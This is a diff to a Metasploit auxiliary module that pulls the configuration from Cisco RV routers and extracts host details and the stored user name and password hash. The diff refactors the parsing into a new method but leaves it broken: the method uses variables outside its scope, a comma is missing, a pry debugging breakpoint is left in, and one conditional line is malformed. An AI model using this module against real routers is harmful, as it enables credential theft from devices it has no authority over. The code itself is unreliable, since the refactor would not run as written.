@@ -34,6 +34,7 @@ class MetasploitModule < Msf::Auxiliary
           ['URL', 'https://bst.cloudapps.cisco.com/bugsearch/bug/CSCvg42801'],
           ['URL', 'http://www.cisco.com/en/US/products/csa/cisco-sa-20110330-acs.html']
         ],
+      'DisclosureDate' => 'Jan 24 2019'
       'DefaultOptions' =>
         {
           'RPORT' => 443,
@@ -73,6 +74,29 @@ class MetasploitModule < Msf::Auxiliary
     create_credential_login(login_data)
   end
 
+  def parse_config(config)
+    # Report loot to database (and store on filesystem)
+    stored_path = store_loot('cisco.rv.config', 'text/plain', rhost, res.body)
+    print_good("Stored configuration (#{res.body.length} bytes) to #{stored_path}")
+
+    # Report host information to database
+    mac = body.match(/^LANMAC=(.*)/)[1]
+    mac = "%s:%s:%s:%s:%s:%s" % [mac[0..1], mac[2..3], mac[4..5],
+                                     mac[6..7], mac[8..9], mac[10..11]]
+    hostname = body.match(/^HOSTNAME=(.*)/)[1]
+    model = body.match(/^MODEL=(.*)/)[1]
+    report_host(host: rhost,
+                mac: mac,
+                name: hostname,
+                os_name: "Cisco",
+                os_flavor: model)
+
+    # Report password hashes to database
+    user = body.match(/^user (.*)/)[1]
+    hash = body.match(/^password (.*)/)[1]
+    report_cred(user, hash)
+  end
+
   def run
     begin
       uri = normalize_uri(target_uri.path)
@@ -86,36 +110,15 @@ class MetasploitModule < Msf::Auxiliary
 
     if res.nil?
       fail_with(Failure::UnexpectedReply, "Empty response.  Please validate the RHOST and TARGETURI options and try again.")
-      return
     elsif res.code != 200
       fail_with(Failure::UnexpectedReply, "Unexpected HTTP #{res.code} response.  Please validate the RHOST and TARGETURI options and try again.")
-      return
     else
+      require 'pry'; binding.pry
       body = res.body
       if body.match(/####sysconfig####/)
-        # Report loot to database (and store on filesystem)
-        stored_path = store_loot('cisco.rv.config', 'text/plain', rhost, res.body)
-        print_good("Stored configuration (#{res.body.length} bytes) to #{stored_path}")
-
-        # Report host information to database
-        mac = body.match(/^LANMAC=(.*)/)[1]
-        mac = "%s:%s:%s:%s:%s:%s" % [mac[0..1], mac[2..3], mac[4..5],
-                                     mac[6..7], mac[8..9], mac[10..11]]
-        hostname = body.match(/^HOSTNAME=(.*)/)[1]
-        model = body.match(/^MODEL=(.*)/)[1]
-        report_host(host: rhost,
-                    mac: mac,
-                    name: hostname,
-                    os_name: "Cisco",
-                    os_flavor: model)
-
-        # Report password hashes to database
-        user = body.match(/^user (.*)/)[1]
-        hash = body.match(/^password (.*)/)[1]
-        report_cred(user, hash)
+        parse_config(body)
       else body.match(/refresh content='0; url=\/default.htm/)
         fail_with(Failure::NotVulnerable, "Response suggests device is patched")
-        return
       end
     end
   end
